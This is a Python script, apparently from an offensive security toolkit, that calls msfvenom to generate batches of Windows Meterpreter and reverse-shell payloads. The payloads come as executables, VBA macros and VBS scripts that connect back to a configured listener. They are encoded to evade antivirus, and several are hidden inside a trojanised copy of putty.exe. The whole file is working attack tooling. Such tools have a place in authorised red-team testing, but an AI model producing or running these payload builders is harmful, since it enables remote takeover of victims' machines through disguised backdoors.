#! /usr/bin/env python3

##MSVenom Basic Payloads

import os
import importlib
from importlib import util

spec = importlib.util.find_spec('.subserv', package='lib')
m = spec.loader.load_module()


##  32 bit MSFVenom MeterpreterShell
def gen_000():
  print(m.bcolors.GREEN + m.bcolors.BOLD + m.bcolors.UNDERLINE + "\tWe are generating the 32bit Meterpreter Payloads NOW!" + m.bcolors.ENDC)
  print(m.bcolors.BLUE + "[*]" + m.bcolors.ENDC + " Generating 001-stageless-32bit payload -------")
  os.system("msfvenom -p " + m.METRT32_SL_Payload + " LHOST=" + m.listener_ip + " LPORT=" + m.METRT32_SL_PORT + " --platform win -a x86 -e x86/shikata_ga_nai -f exe >" + m.targetfile + "001-SL-MET.exe")

  print(m.bcolors.BLUE + "[*]" + m.bcolors.ENDC + " Generating 002-stageless-32bit-putty payload -------")
  os.system("msfvenom -p " + m.METRT32_SL_Payload + " LHOST=" + m.listener_ip + " LPORT=" + m.METRT32_SL_PORT + " --platform win -a x86 -e x86/shikata_ga_nai -x ./src/putty.exe -k -f exe >" + m.targetfile + "002-SL-MET-Putty.exe")

  print(m.bcolors.BLUE + "[*]" + m.bcolors.ENDC + " Generating 003-stageless-32bit-VBA payload -------")
  os.system("msfvenom -p " + m.METRT32_SL_Payload + " LHOST=" + m.listener_ip + " LPORT=" + m.METRT32_SL_PORT + " --platform win  -a x86 -e x86/shikata_ga_nai -f vba >" + m.targetfile + "003-SL-MET.vba")


##  64 bit MSFVenom MeterpreterShell
def gen_010():
  print(m.bcolors.GREEN + m.bcolors.BOLD + m.bcolors.UNDERLINE + "\tWe are generating the 64bit Meterpreter Payloads NOW!" + m.bcolors.ENDC)
  print(m.bcolors.BLUE + "[*]" + m.bcolors.ENDC + " Generating 010-stageless-64bit payload -------")
  os.system("msfvenom -p " + m.METRT64_SL_Payload + " LHOST=" + m.listener_ip + " LPORT=" + m.METRT64_SL_PORT + " --platform win -a x64 -e  x64/xor -i 3 -f exe >" + m.targetfile + "010-SL-MET.exe")

  print(m.bcolors.BLUE + "[*]" + m.bcolors.ENDC + " Generating 011-stageless-64bit-putty payload -------")
  os.system("msfvenom -p " + m.METRT64_SL_Payload + " LHOST=" + m.listener_ip + " LPORT=" + m.METRT64_SL_PORT + " --platform win  -a x64 -e  x64/xor -i 3 -x ./src/putty.exe -k -f exe >" + m.targetfile + "011-SL-MET-Putty.exe")

  print(m.bcolors.BLUE + "[*]" + m.bcolors.ENDC + " Generating 012-stageless-64bit-VBS payload -------")
  os.system("msfvenom -p " + m.METRT64_SL_Payload + " LHOST=" + m.listener_ip + " LPORT=" + m.METRT64_SL_PORT + " --platform win  -a x64 -e  x64/xor -i 3 -f vbs >" + m.targetfile + "012-SL-MET.vbs")

  print(m.bcolors.BLUE + "[*]" + m.bcolors.ENDC + " Generating 013-stageless-64bit-VBA payload -------")
  os.system("msfvenom -p " + m.METRT64_SL_Payload + " LHOST=" + m.listener_ip + " LPORT=" + m.METRT64_SL_PORT + " --platform win  -a x64 -e  x64/xor -i 3 -f vba >" + m.targetfile + "013-SL-MET.vba")


##  64 bit MSFVenom Basic Shell
def gen_020():
  print(m.bcolors.GREEN + m.bcolors.BOLD + m.bcolors.UNDERLINE + "\tWe are generating the 64bit SHELL  Payloads NOW!" + m.bcolors.ENDC)
  print(m.bcolors.BLUE + "[*]" + m.bcolors.ENDC + " Generating 020-stageless-64bit payload -------")
  os.system("msfvenom -p " + m.SHELL64_SL_Payload + " LHOST=" + m.listener_ip + " LPORT=" + m.SHELL64_SL_PORT + " --platform win -a x64 -e  x64/xor -i 3 -f exe-only >" + m.targetfile + "020-SL-Shell.exe")

  print(m.bcolors.BLUE + "[*]" + m.bcolors.ENDC + " Generating 021-stageless-64bit-putty payload -------")
  os.system("msfvenom -p " + m.SHELL64_SL_Payload + " LHOST=" + m.listener_ip + " LPORT=" + m.SHELL64_SL_PORT + " --platform win  -a x64 -e  x64/xor -i 3 -x ./src/putty.exe -k -f exe-only >" + m.targetfile + "021-SL-Shell-Putty.exe")

  print(m.bcolors.BLUE + "[*]" + m.bcolors.ENDC + " Generating 022-stageless-64bit-VBS payload -------")
  os.system("msfvenom -p " + m.SHELL64_SL_Payload + " LHOST=" + m.listener_ip + " LPORT=" + m.SHELL64_SL_PORT + " --platform win  -a x64 -e  x64/xor -i 3 -f vbs >" + m.targetfile + "022-SL-Shell.vbs")

  print(m.bcolors.BLUE + "[*]" + m.bcolors.ENDC + " Generating 023-stageless-64bit-VBA payload -------")
  os.system("msfvenom -p " + m.SHELL64_SL_Payload + " LHOST=" + m.listener_ip + " LPORT=" + m.SHELL64_SL_PORT + " --platform win  -a x64 -e  x64/xor -i 3 -f vba >" + m.targetfile + "023-SL-Shell.vba")
